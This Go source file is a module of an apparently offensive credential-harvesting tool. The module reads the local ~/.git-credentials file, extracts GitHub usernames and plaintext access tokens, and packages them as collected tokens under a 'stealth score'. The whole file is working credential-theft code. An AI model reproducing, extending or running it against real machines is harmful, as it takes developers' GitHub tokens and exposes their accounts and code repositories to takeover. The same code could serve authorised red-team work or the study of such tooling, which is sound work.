package github

import (
	"fmt"
	"net/url"
	"os"
	"strings"

	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

func init() {
	registry.Register("github", "git_credentials", func() collector.Collector {
		return &GitCredentialsCollector{BaseCollector: collector.BaseCollector{Svc: "github", Src: "git_credentials"}}
	})
}

// GitCredentialsCollector parses ~/.git-credentials for GitHub entries.
type GitCredentialsCollector struct {
	collector.BaseCollector
}

func (c *GitCredentialsCollector) Service() string      { return c.Svc }
func (c *GitCredentialsCollector) Source() string        { return c.Src }
func (c *GitCredentialsCollector) StealthScore() int     { return 5 }
func (c *GitCredentialsCollector) Platforms() []string   { return nil }

type credEntry struct {
	host     string
	username string
	token    string
	scheme   string
}

// parseCredentials parses .git-credentials file.
// Format: https://user:token@github.com
func (c *GitCredentialsCollector) parseCredentials(text string) []credEntry {
	var entries []credEntry
	for _, line := range strings.Split(strings.TrimSpace(text), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parsed, err := url.Parse(line)
		if err != nil {
			continue
		}
		if parsed.Hostname() == "" {
			continue
		}
		password, _ := parsed.User.Password()
		if password == "" {
			continue
		}
		entries = append(entries, credEntry{
			host:     parsed.Hostname(),
			username: parsed.User.Username(),
			token:    password,
			scheme:   parsed.Scheme,
		})
	}
	return entries
}

func (c *GitCredentialsCollector) Discover() []*types.DiscoveredToken {
	var results []*types.DiscoveredToken

	path := platform.GitCredentialsPath()
	if _, err := os.Stat(path); err != nil {
		return results
	}

	data, err := os.ReadFile(path)
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to read %s: %v", path, err))
		return results
	}

	entries := c.parseCredentials(string(data))
	for _, entry := range entries {
		if !strings.Contains(strings.ToLower(entry.host), "github") {
			continue
		}
		results = append(results, &types.DiscoveredToken{
			Service:      c.Svc,
			Source:       c.Src,
			Path:         path,
			AccountHint:  fmt.Sprintf("%s@%s", entry.username, entry.host),
			StealthScore: 5,
		})
	}

	return results
}

func (c *GitCredentialsCollector) Collect() []*types.CollectedToken {
	var results []*types.CollectedToken

	path := platform.GitCredentialsPath()
	if _, err := os.Stat(path); err != nil {
		return results
	}

	data, err := os.ReadFile(path)
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to collect from %s: %v", path, err))
		return results
	}

	entries := c.parseCredentials(string(data))
	for _, entry := range entries {
		if !strings.Contains(strings.ToLower(entry.host), "github") {
			continue
		}
		tok := types.NewCollectedToken(c.Svc, c.Src, 5)
		tok.Username = entry.username
		tok.AccessToken = types.Secure(entry.token)
		tok.Extra["host"] = entry.host
		tok.Extra["scheme"] = entry.scheme
		results = append(results, tok)
	}

	return results
}
